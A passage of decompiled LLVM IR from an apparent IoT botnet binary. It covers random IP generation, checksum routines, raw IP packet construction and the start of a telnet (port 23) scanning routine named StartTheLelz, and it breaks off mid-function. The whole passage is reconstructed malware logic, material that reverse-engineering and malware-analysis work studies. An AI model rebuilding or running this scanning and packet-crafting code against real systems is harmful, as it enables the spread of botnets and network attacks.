  %v5_8049dfa = icmp slt i8 %stack_var_-15.0.in, 0
  %v1_8049dfc = icmp eq i1 %v5_8049dfa, false
  br i1 %v1_8049dfc, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e02

dec_label_pc_8049e02:                             ; preds = %dec_label_pc_8049df6, %dec_label_pc_8049dee, %dec_label_pc_8049de6
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %v10_8049e06 = icmp eq i8 %v3_8049dd2, 127
  br i1 %v10_8049e06, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e0e

dec_label_pc_8049e0e:                             ; preds = %dec_label_pc_8049e02
  %v11_8049e12 = icmp eq i8 %v3_8049dd2, -87
  %v1_8049e14 = icmp eq i1 %v11_8049e12, false
  br i1 %v1_8049e14, label %dec_label_pc_8049e22, label %dec_label_pc_8049e16

dec_label_pc_8049e16:                             ; preds = %dec_label_pc_8049e0e
  %v4_8049e1618 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e1618, i32* @eax, align 4
  %v11_8049e1a = icmp eq i8 %stack_var_-15.0.in, -2
  br i1 %v11_8049e1a, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e22

dec_label_pc_8049e22:                             ; preds = %dec_label_pc_8049e16, %dec_label_pc_8049e0e
  %v11_8049e26 = icmp eq i8 %v3_8049dd2, -84
  %v1_8049e28 = icmp eq i1 %v11_8049e26, false
  br i1 %v1_8049e28, label %dec_label_pc_8049e3e, label %dec_label_pc_8049e2a

dec_label_pc_8049e2a:                             ; preds = %dec_label_pc_8049e22
  %tmp73 = icmp ult i8 %stack_var_-15.0.in, 17
  br i1 %tmp73, label %dec_label_pc_8049e32, label %dec_label_pc_8049e3e

dec_label_pc_8049e32:                             ; preds = %dec_label_pc_8049e2a
  %v4_8049e2a19 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e2a19, i32* @eax, align 4
  br i1 true, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e3e

dec_label_pc_8049e3e:                             ; preds = %dec_label_pc_8049e2a, %dec_label_pc_8049e32, %dec_label_pc_8049e22
  %v8_8049e42 = icmp eq i8 %v3_8049dd2, -64
  %v1_8049e44 = icmp eq i1 %v8_8049e42, false
  br i1 %v1_8049e44, label %dec_label_pc_8049e76, label %dec_label_pc_8049e46

dec_label_pc_8049e46:                             ; preds = %dec_label_pc_8049e3e
  %v4_8049e4620 = urem i32 %stack_var_-15.0.in.in, 256
  %v4_8049e4a = icmp eq i8 %stack_var_-15.0.in, 0
  %v1_8049e4c = icmp eq i1 %v4_8049e4a, false
  br i1 %v1_8049e4c, label %dec_label_pc_8049e62, label %dec_label_pc_8049e4e

dec_label_pc_8049e4e:                             ; preds = %dec_label_pc_8049e46
  %v4_8049e4e21 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049e4e21, i32* @eax, align 4
  %v10_8049e52 = icmp eq i8 %stack_var_-14.0.in, 2
  br i1 %v10_8049e52, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e62

dec_label_pc_8049e62:                             ; preds = %dec_label_pc_8049e4e, %dec_label_pc_8049e46
  %v10_8049e66 = icmp eq i8 %stack_var_-15.0.in, 88
  %v1_8049e68 = icmp eq i1 %v10_8049e66, false
  br i1 %v1_8049e68, label %dec_label_pc_8049e7e, label %dec_label_pc_8049e6a

dec_label_pc_8049e6a:                             ; preds = %dec_label_pc_8049e62
  %v4_8049e6a23 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049e6a23, i32* @eax, align 4
  %v10_8049e6e = icmp eq i8 %stack_var_-14.0.in, 99
  br i1 %v10_8049e6e, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e7e

dec_label_pc_8049e76:                             ; preds = %dec_label_pc_8049e3e
  br label %dec_label_pc_8049e8a

dec_label_pc_8049e7e:                             ; preds = %dec_label_pc_8049e6a, %dec_label_pc_8049e62
  store i32 %v4_8049e4620, i32* @eax, align 4
  %v11_8049e82 = icmp eq i8 %stack_var_-15.0.in, -88
  br i1 %v11_8049e82, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e8a

dec_label_pc_8049e8a:                             ; preds = %dec_label_pc_8049e76, %dec_label_pc_8049e7e
  %v11_8049e8e = icmp eq i8 %v3_8049dd2, -58
  %v1_8049e90 = icmp eq i1 %v11_8049e8e, false
  br i1 %v1_8049e90, label %dec_label_pc_8049eaa.thread, label %dec_label_pc_8049e92

dec_label_pc_8049eaa.thread:                      ; preds = %dec_label_pc_8049e8a
  br label %dec_label_pc_8049ec6

dec_label_pc_8049e92:                             ; preds = %dec_label_pc_8049e8a
  %v4_8049e9225 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049e9225, i32* @eax, align 4
  %v10_8049e96 = icmp eq i8 %stack_var_-15.0.in, 18
  br i1 %v10_8049e96, label %dec_label_pc_8049cd0, label %dec_label_pc_8049e9e

dec_label_pc_8049e9e:                             ; preds = %dec_label_pc_8049e92
  store i32 %v4_8049e9225, i32* @eax, align 4
  %v10_8049ea2 = icmp eq i8 %stack_var_-15.0.in, 19
  br i1 %v10_8049ea2, label %dec_label_pc_8049cd0, label %dec_label_pc_8049eb2

dec_label_pc_8049eb2:                             ; preds = %dec_label_pc_8049e9e
  %v10_8049eb6 = icmp eq i8 %stack_var_-15.0.in, 51
  %v1_8049eb8 = icmp eq i1 %v10_8049eb6, false
  br i1 %v1_8049eb8, label %dec_label_pc_8049ec6, label %dec_label_pc_8049eba

dec_label_pc_8049eba:                             ; preds = %dec_label_pc_8049eb2
  %v4_8049eba28 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049eba28, i32* @eax, align 4
  %v10_8049ebe = icmp eq i8 %stack_var_-14.0.in, 100
  br i1 %v10_8049ebe, label %dec_label_pc_8049cd0, label %dec_label_pc_8049ec6

dec_label_pc_8049ec6:                             ; preds = %dec_label_pc_8049eaa.thread, %dec_label_pc_8049eba, %dec_label_pc_8049eb2
  %v11_8049eca = icmp eq i8 %v3_8049dd2, -53
  %v1_8049ecc = icmp eq i1 %v11_8049eca, false
  br i1 %v1_8049ecc, label %dec_label_pc_8049ee2, label %dec_label_pc_8049ece

dec_label_pc_8049ece:                             ; preds = %dec_label_pc_8049ec6
  %v4_8049ed2 = icmp eq i8 %stack_var_-15.0.in, 0
  %v1_8049ed4 = icmp eq i1 %v4_8049ed2, false
  br i1 %v1_8049ed4, label %dec_label_pc_8049ee2, label %dec_label_pc_8049ed6

dec_label_pc_8049ed6:                             ; preds = %dec_label_pc_8049ece
  %v4_8049ed630 = urem i32 %stack_var_-14.0.in.in, 256
  store i32 %v4_8049ed630, i32* @eax, align 4
  %v10_8049eda = icmp eq i8 %stack_var_-14.0.in, 113
  br i1 %v10_8049eda, label %dec_label_pc_8049cd0, label %dec_label_pc_8049ee2

dec_label_pc_8049ee2:                             ; preds = %dec_label_pc_8049ed6, %dec_label_pc_8049ece, %dec_label_pc_8049ec6
  store i32 %stack_var_-16.0.in, i32* @eax, align 4
  %tmp74 = icmp ult i8 %v3_8049dd2, -32
  br i1 %tmp74, label %dec_label_pc_8049eee, label %dec_label_pc_8049cd0

dec_label_pc_8049eee:                             ; preds = %dec_label_pc_8049ee2
  store i32 0, i32* %stack_var_-32, align 4
  %v4_8049f0a32 = urem i32 %storemerge36.in, 256
  store i32 %v4_8049f0a32, i32* @edx, align 4
  %v4_8049f1133 = urem i32 %stack_var_-14.0.in.in, 256
  %v4_8049f1834 = urem i32 %stack_var_-15.0.in.in, 256
  store i32 %v4_8049f1834, i32* @ebx, align 4
  %v1_8049f23 = urem i32 %stack_var_-16.0.in, 256
  %v2_8049f26 = ptrtoint i32* %stack_var_-32 to i32
  %v7_8049f44 = call i32 @zprintf(i32 %v2_8049f26, i32 ptrtoint ([12 x i8]* @global_var_8052e63.32 to i32), i32 %v1_8049f23, i32 %v4_8049f1834, i32 %v4_8049f1133, i32 %v4_8049f0a32)
  %v1_8049f4f = call i32 @inet_addr(i32 %v2_8049f26)
  %v2_8049f57 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049f57, i32* @ebx, align 4
  store i32 %v0_8049bc1, i32* @esi, align 4
  ret i32 %v1_8049f4f

; uselistorder directives
  uselistorder i32 %v4_8049f0a32, { 1, 0 }
  uselistorder i8 %stack_var_-15.0.in, { 10, 0, 1, 2, 3, 4, 9, 5, 6, 8, 7 }
  uselistorder i32 %v2_8049d84, { 1, 0 }
  uselistorder i32 %v2_8049d46, { 1, 0 }
  uselistorder i32 %v2_8049d08, { 1, 0 }
  uselistorder i32 %v2_8049c81, { 1, 0 }
  uselistorder i32 %v2_8049c43, { 1, 0 }
  uselistorder i32 %v2_8049c05, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_8049ec6, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8049e8a, { 1, 0 }
  uselistorder label %dec_label_pc_8049e3e, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049dce, { 1, 0 }
}

define i32 @getRandomIP(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8049f5b = load i32, i32* @ebp, align 4
  store i32 %v0_8049f5b, i32* %stack_var_-4, align 4
  %v0_8049f61 = load i32, i32* @global_var_805b980.33, align 128
  %v1_8049f69 = call i32 @ntohl(i32 %v0_8049f61)
  %v5_8049f6e = and i32 %v1_8049f69, %arg1
  %v1_8049f74 = call i32 @rand_cmwc(i32 %v5_8049f6e)
  %v1_8049f7e = sub i32 -1, %arg1
  %v2_8049f80 = and i32 %v1_8049f74, %v1_8049f7e
  %v5_8049f82 = xor i32 %v2_8049f80, %v5_8049f6e
  %v2_8049f85 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049f85, i32* @ebp, align 4
  ret i32 %v5_8049f82
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8049f8c = load i32, i32* @ebx, align 4
  %v4_8049fbb33 = add i32 %arg2, -1
  %v9_8049fbb34 = sub i32 0, %arg2
  %v10_8049fbb35 = and i32 %arg2, %v9_8049fbb34
  %v11_8049fbb36 = icmp slt i32 %v10_8049fbb35, 0
  %v12_8049fbb37 = icmp eq i32 %v4_8049fbb33, 0
  %v13_8049fbb38 = icmp slt i32 %v4_8049fbb33, 0
  %v3_8049fbf39 = icmp eq i1 %v13_8049fbb38, %v11_8049fbb36
  %v4_8049fbf40 = icmp eq i1 %v12_8049fbb37, false
  %v5_8049fbf41 = and i1 %v4_8049fbf40, %v3_8049fbf39
  br i1 %v5_8049fbf41, label %dec_label_pc_8049fa0, label %dec_label_pc_8049fc1

dec_label_pc_8049fa0:                             ; preds = %entry, %dec_label_pc_8049fa0
  %stack_var_-24.045 = phi i16 [ %v9_8049fb0, %dec_label_pc_8049fa0 ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_8049fb7, %dec_label_pc_8049fa0 ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_8049fb3, %dec_label_pc_8049fa0 ], [ %arg1, %entry ]
  %v3_8049fad42 = phi i32 [ %v6_8049fad, %dec_label_pc_8049fa0 ], [ 0, %entry ]
  %v4_8049fa0 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_8049fa3 = load i16, i16* %stack_var_4.043, align 2
  %v3_8049fa3 = zext i16 %v2_8049fa3 to i32
  %sext51 = mul i32 %v3_8049fad42, 65536
  %v4_8049fad = sdiv i32 %sext51, 65536
  %v6_8049fad = add nsw i32 %v3_8049fa3, %v4_8049fad
  %v11_8049fad = icmp ult i32 %v6_8049fad, %v4_8049fad
  %v26_8049fad = trunc i32 %v6_8049fad to i16
  %v7_8049fb0 = zext i1 %v11_8049fad to i16
  %v9_8049fb0 = add i16 %v7_8049fb0, %stack_var_-24.045
  %v5_8049fb3 = add i32 %v4_8049fa0, 2
  %v23_8049fb3 = inttoptr i32 %v5_8049fb3 to i16*
  %v4_8049fb7 = add i32 %stack_var_8.044, -2
  %v4_8049fbb = add i32 %stack_var_8.044, -3
  %v9_8049fbb = sub i32 2, %stack_var_8.044
  %v10_8049fbb = and i32 %v4_8049fb7, %v9_8049fbb
  %v11_8049fbb = icmp slt i32 %v10_8049fbb, 0
  %v12_8049fbb = icmp eq i32 %v4_8049fbb, 0
  %v13_8049fbb = icmp slt i32 %v4_8049fbb, 0
  %v3_8049fbf = icmp eq i1 %v13_8049fbb, %v11_8049fbb
  %v4_8049fbf = icmp eq i1 %v12_8049fbb, false
  %v5_8049fbf = and i1 %v4_8049fbf, %v3_8049fbf
  br i1 %v5_8049fbf, label %dec_label_pc_8049fa0, label %dec_label_pc_8049fc1

dec_label_pc_8049fc1:                             ; preds = %dec_label_pc_8049fa0, %entry
  %v3_8049fad.lcssa = phi i16 [ 0, %entry ], [ %v26_8049fad, %dec_label_pc_8049fa0 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_8049fb3, %dec_label_pc_8049fa0 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_8049fb7, %dec_label_pc_8049fa0 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_8049fb0, %dec_label_pc_8049fa0 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804a002.preheader, label %dec_label_pc_8049fc7

dec_label_pc_8049fc7:                             ; preds = %dec_label_pc_8049fc1
  %v1_8049fca = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_8049fca = load i8, i8* %v1_8049fca, align 1
  %v3_8049fca = zext i8 %v2_8049fca to i32
  %v4_8049fd5 = sext i16 %v3_8049fad.lcssa to i32
  %v6_8049fd5 = add nsw i32 %v3_8049fca, %v4_8049fd5
  %v11_8049fd5 = icmp ult i32 %v6_8049fd5, %v4_8049fd5
  %v26_8049fd5 = trunc i32 %v6_8049fd5 to i16
  %v7_8049fd8 = zext i1 %v11_8049fd5 to i16
  %v9_8049fd8 = add i16 %v7_8049fd8, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804a002.preheader

dec_label_pc_804a002.preheader:                   ; preds = %dec_label_pc_8049fc7, %dec_label_pc_8049fc1
  %v3_8049fe7.ph = phi i16 [ %v3_8049fad.lcssa, %dec_label_pc_8049fc1 ], [ %v26_8049fd5, %dec_label_pc_8049fc7 ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_8049fc1 ], [ %v9_8049fd8, %dec_label_pc_8049fc7 ]
  %v4_804a00220 = sext i16 %v3_8049fe7.ph to i32
  %v4_804a00521 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804a00822 = udiv i32 %v4_804a00220, 65536
  %v4_804a00823 = mul i32 %v4_804a00521, 65536
  %v5_804a00824 = or i32 %v4_804a00823, %v3_804a00822
  %v2_804a00c25 = udiv i32 %v4_804a00521, 65536
  %v2_804a00f26 = or i32 %v5_804a00824, %v2_804a00c25
  %v3_804a00f27 = icmp eq i32 %v2_804a00f26, 0
  %v1_804a01328 = icmp eq i1 %v3_804a00f27, false
  br i1 %v1_804a01328, label %dec_label_pc_8049fdd, label %dec_label_pc_804a015

dec_label_pc_8049fdd:                             ; preds = %dec_label_pc_804a002.preheader, %dec_label_pc_8049fdd
  %v2_804a00c31 = phi i32 [ %v2_804a00c, %dec_label_pc_8049fdd ], [ %v2_804a00c25, %dec_label_pc_804a002.preheader ]
  %v5_804a00830 = phi i32 [ %v5_804a008, %dec_label_pc_8049fdd ], [ %v5_804a00824, %dec_label_pc_804a002.preheader ]
  %v4_804a00229 = phi i32 [ %v4_804a002, %dec_label_pc_8049fdd ], [ %v4_804a00220, %dec_label_pc_804a002.preheader ]
  %v2_8049ff8 = add i32 %v5_804a00830, %v4_804a00229
  %v7_8049ff8 = icmp ult i32 %v2_8049ff8, %v4_804a00229
  %v3_8049ffa = zext i1 %v7_8049ff8 to i32
  %v5_8049ffa = add nuw nsw i32 %v3_8049ffa, %v2_804a00c31
  %sext = mul i32 %v2_8049ff8, 65536
  %v4_804a002 = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_8049ffa, 65536
  %v4_804a005 = sdiv i32 %sext50, 65536
  %v3_804a008 = udiv i32 %v4_804a002, 65536
  %v5_804a008 = or i32 %sext50, %v3_804a008
  %v2_804a00c = udiv i32 %v4_804a005, 65536
  %v2_804a00f = or i32 %v5_804a008, %v2_804a00c
  %v3_804a00f = icmp eq i32 %v2_804a00f, 0
  %v1_804a013 = icmp eq i1 %v3_804a00f, false
  br i1 %v1_804a013, label %dec_label_pc_8049fdd, label %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge

dec_label_pc_804a002.dec_label_pc_804a015_crit_edge: ; preds = %dec_label_pc_8049fdd
  br label %dec_label_pc_804a015

dec_label_pc_804a015:                             ; preds = %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge, %dec_label_pc_804a002.preheader
  %v4_804a002.lcssa = phi i32 [ %v4_804a002, %dec_label_pc_804a002.dec_label_pc_804a015_crit_edge ], [ %v4_804a00220, %dec_label_pc_804a002.preheader ]
  %v1_804a019 = urem i32 %v4_804a002.lcssa, 65536
  %v1_804a01b = xor i32 %v1_804a019, 65535
  store i32 %v0_8049f8c, i32* @ebx, align 4
  ret i32 %v1_804a01b

; uselistorder directives
  uselistorder i32 %v5_804a008, { 1, 0 }
  uselistorder i32 %v4_804a002, { 1, 0, 2 }
  uselistorder i32 %v2_804a00c25, { 1, 0 }
  uselistorder i32 %v4_804a00521, { 1, 0 }
  uselistorder i32 %v4_804a00220, { 2, 1, 0 }
  uselistorder i32 %v4_8049fd5, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_8049fad.lcssa, { 1, 0 }
  uselistorder i32 %v4_8049fbb, { 1, 0 }
  uselistorder i32 %v4_8049fb7, { 0, 2, 1 }
  uselistorder i32 %v6_8049fad, { 1, 2, 0 }
  uselistorder i32 %v4_8049fad, { 1, 0 }
  uselistorder label %dec_label_pc_8049fdd, { 1, 0 }
  uselistorder label %dec_label_pc_8049fa0, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a026 = load i32, i32* @ebp, align 4
  store i32 %v0_804a026, i32* %stack_var_-4, align 4
  %v4_804a026 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804a026, i32* @ebp, align 4
  %v1_804a03a = add i32 %tmp10, 12
  %v2_804a03a = inttoptr i32 %v1_804a03a to i32*
  %v3_804a03a = load i32, i32* %v2_804a03a, align 4
  %v1_804a043 = add i32 %tmp10, 16
  %v2_804a043 = inttoptr i32 %v1_804a043 to i32*
  %v3_804a043 = load i32, i32* %v2_804a043, align 4
  %v2_804a058 = call i32 @htons(i16 20)
  %v1_804a071 = call i32 @malloc(i32 32)
  store i32 %v1_804a071, i32* %ecx.global-to-local, align 4
  %v2_804a081 = inttoptr i32 %v1_804a071 to i32*
  store i32 %v3_804a03a, i32* %v2_804a081, align 4
  %v1_804a086 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a086 = add i32 %v1_804a086, 4
  %v3_804a086 = inttoptr i32 %v2_804a086 to i32*
  store i32 %v3_804a043, i32* %v3_804a086, align 4
  %v1_804a08c = load i32, i32* %ecx.global-to-local, align 4
  %v2_804a08c = add i32 %v1_804a08c, 8
  %v3_804a08c = inttoptr i32 %v2_804a08c to i32*
  store i32 0, i32* %v3_804a08c, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804a095 = add i32 %v1_804a071, 12
  store i32 %v1_804a095, i32* %edx.global-to-local, align 4
  %v1_804a098 = inttoptr i32 %tmp2 to i32*
  %v2_804a098 = load i32, i32* %v1_804a098, align 4
  %v2_804a09a = inttoptr i32 %v1_804a095 to i32*
  store i32 %v2_804a098, i32* %v2_804a09a, align 4
  %v0_804a09c = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a09c = add i32 %v0_804a09c, 4
  %v2_804a09c = inttoptr i32 %v1_804a09c to i32*
  %v3_804a09c = load i32, i32* %v2_804a09c, align 4
  %v1_804a09f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a09f = add i32 %v1_804a09f, 4
  %v3_804a09f = inttoptr i32 %v2_804a09f to i32*
  store i32 %v3_804a09c, i32* %v3_804a09f, align 4
  %v0_804a0a2 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0a2 = add i32 %v0_804a0a2, 8
  %v2_804a0a2 = inttoptr i32 %v1_804a0a2 to i32*
  %v3_804a0a2 = load i32, i32* %v2_804a0a2, align 4
  %v1_804a0a5 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0a5 = add i32 %v1_804a0a5, 8
  %v3_804a0a5 = inttoptr i32 %v2_804a0a5 to i32*
  store i32 %v3_804a0a2, i32* %v3_804a0a5, align 4
  %v0_804a0a8 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0a8 = add i32 %v0_804a0a8, 12
  %v2_804a0a8 = inttoptr i32 %v1_804a0a8 to i32*
  %v3_804a0a8 = load i32, i32* %v2_804a0a8, align 4
  %v1_804a0ab = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0ab = add i32 %v1_804a0ab, 12
  %v3_804a0ab = inttoptr i32 %v2_804a0ab to i32*
  store i32 %v3_804a0a8, i32* %v3_804a0ab, align 4
  %v0_804a0ae = load i32, i32* %ecx.global-to-local, align 4
  %v1_804a0ae = add i32 %v0_804a0ae, 16
  %v2_804a0ae = inttoptr i32 %v1_804a0ae to i32*
  %v3_804a0ae = load i32, i32* %v2_804a0ae, align 4
  %v1_804a0b1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0b1 = add i32 %v1_804a0b1, 16
  %v3_804a0b1 = inttoptr i32 %v2_804a0b1 to i32*
  store i32 %v3_804a0ae, i32* %v3_804a0b1, align 4
  %v2_804a0c1 = inttoptr i32 %v1_804a071 to i16*
  %v3_804a0c1 = call i32 @csum(i16* %v2_804a0c1, i32 32)
  %v1_804a0c6 = urem i32 %v3_804a0c1, 65536
  %v1_804a0d3 = call i32 @free(i32 %v1_804a071)
  %v2_804a0dc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a0dc, i32* @ebp, align 4
  ret i32 %v1_804a0c6

; uselistorder directives
  uselistorder i32 %v1_804a071, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_1()
  %tmp8 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_804a0de = load i32, i32* @ebp, align 4
  store i32 %v0_804a0de, i32* %stack_var_-4, align 4
  %v4_804a0e4 = sext i8 %tmp8 to i32
  %v4_804a0ea = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804a105 = add i32 %v4_804a0ea, 1
  %v2_804a105 = inttoptr i32 %v1_804a105 to i8*
  store i8 0, i8* %v2_804a105, align 1
  %v1_804a10f = add i32 %tmp5, 20
  %v1_804a118 = trunc i32 %v1_804a10f to i16
  %v3_804a118 = add i32 %v4_804a0ea, 2
  %v4_804a118 = inttoptr i32 %v3_804a118 to i16*
  store i16 %v1_804a118, i16* %v4_804a118, align 2
  %v2_804a11c = call i32 @rand_cmwc(i32 %v4_804a0e4)
  %v1_804a127 = trunc i32 %v2_804a11c to i16
  %v3_804a127 = add i32 %v4_804a0ea, 4
  %v4_804a127 = inttoptr i32 %v3_804a127 to i16*
  store i16 %v1_804a127, i16* %v4_804a127, align 2
  %v1_804a12e = add i32 %v4_804a0ea, 6
  %v2_804a12e = inttoptr i32 %v1_804a12e to i16*
  store i16 0, i16* %v2_804a12e, align 2
  %v1_804a137 = add i32 %v4_804a0ea, 8
  %v2_804a137 = inttoptr i32 %v1_804a137 to i8*
  store i8 -1, i8* %v2_804a137, align 1
  %v3_804a142 = add i32 %v4_804a0ea, 9
  %v4_804a142 = inttoptr i32 %v3_804a142 to i8*
  store i8 %tmp8, i8* %v4_804a142, align 1
  %v1_804a148 = add i32 %v4_804a0ea, 10
  %v2_804a148 = inttoptr i32 %v1_804a148 to i16*
  store i16 0, i16* %v2_804a148, align 2
  %v2_804a154 = add i32 %v4_804a0ea, 12
  %v3_804a154 = inttoptr i32 %v2_804a154 to i32*
  %v2_804a15d = add i32 %v4_804a0ea, 16
  %v3_804a15d = inttoptr i32 %v2_804a15d to i32*
  store i32 %tmp, i32* %v3_804a15d, align 4
  %v2_804a160 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804a160, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a162 = load i32, i32* @ebp, align 4
  store i32 %v0_804a162, i32* %stack_var_-4, align 4
  %v4_804a168 = add i32 %arg1, -2
  %v9_804a168 = sub i32 1, %arg1
  %v10_804a168 = and i32 %v9_804a168, %arg1
  %v11_804a168 = icmp slt i32 %v10_804a168, 0
  %v12_804a168 = icmp eq i32 %v4_804a168, 0
  %v13_804a168 = icmp slt i32 %v4_804a168, 0
  %v3_804a16c = icmp eq i1 %v13_804a168, %v11_804a168
  %v4_804a16c = icmp eq i1 %v12_804a168, false
  %v5_804a16c = and i1 %v4_804a16c, %v3_804a16c
  br i1 %v5_804a16c, label %dec_label_pc_804a177, label %dec_label_pc_804a189

dec_label_pc_804a177:                             ; preds = %entry
  %v1_804a17d = call i32 @__libc_close(i32 %arg1)
  %v2_804a18c.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804a189

dec_label_pc_804a189:                             ; preds = %entry, %dec_label_pc_804a177
  %v2_804a18c = phi i32 [ %v2_804a18c.pre, %dec_label_pc_804a177 ], [ %v0_804a162, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804a177 ], [ 1, %entry ]
  store i32 %v2_804a18c, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804a168, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804a189, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp10 = call i8* @__decompiler_undefined_function_1()
  %tmp11 = call i8* @__decompiler_undefined_function_1()
  %tmp12 = call i8* @__decompiler_undefined_function_1()
  %tmp13 = call i32 @__decompiler_undefined_function_0()
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  %tmp15 = call i32 @__decompiler_undefined_function_0()
  %tmp16 = call i32 @__decompiler_undefined_function_0()
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp23 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-204 = alloca i32, align 4
  %v0_804a193 = load i32, i32* @ebx, align 4
  %v1_804a19a = call i32 @getdtablesize(i32 %v0_804a193)
  %v2_804a1a3 = ashr i32 %v1_804a19a, 31
  %v2_804a1a6 = udiv i32 %v2_804a1a3, 1073741824
  %v2_804a1a9 = add i32 %v2_804a1a6, %v1_804a19a
  %v2_804a1ab = sdiv i32 %v2_804a1a9, 4
  %v2_804a1b4 = mul nsw i32 %v2_804a1ab, 3
  store i32 %v2_804a1b4, i32* %eax.global-to-local, align 4
  %v7_804a1cc = icmp sgt i32 %v2_804a1b4, 512
  %.v2_804a1b4 = select i1 %v7_804a1cc, i32 512, i32 %v2_804a1b4
  store i32 %.v2_804a1b4, i32* %edx.global-to-local, align 4
  store i32 2, i32* %stack_var_-204, align 4
  %v2_804a1f1 = call i32 @htons(i16 23)
  %v2_804a200 = ptrtoint i32* %stack_var_-204 to i32
  %v2_804a221 = mul i32 %.v2_804a1b4, 24
  %v1_804a227 = add i32 %v2_804a221, 30
  %v2_804a22a = and i32 %v1_804a227, -16
  %v0_804a230 = load i32, i32* @esp, align 4
  %v2_804a230 = sub i32 %v0_804a230, %v2_804a22a
  %v1_804a242 = add i32 %v2_804a230, 47
  %v2_804a245 = and i32 %v1_804a242, -16
  %v2_804a262 = mul i32 %.v2_804a1b4, 5
  store i32 %v2_804a262, i32* %edx.global-to-local, align 4
  %v1_804a268 = inttoptr i32 %v2_804a245 to i8*
  store i32 %v2_804a245, i32* @edi, align 4
  %v1_804a26d = and i32 %v1_804a242, -256
  store i32 %v1_804a26d, i32* %eax.global-to-local, align 4
  %v5_804a26f = call i8* @_memset(i8* %v1_804a268, i32 %v1_804a26d, i32 %v2_804a262)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804a2ec85 = icmp sgt i32 %v2_804a1a9, 3
  %v2_804a289 = or i32 %v2_804a245, 9
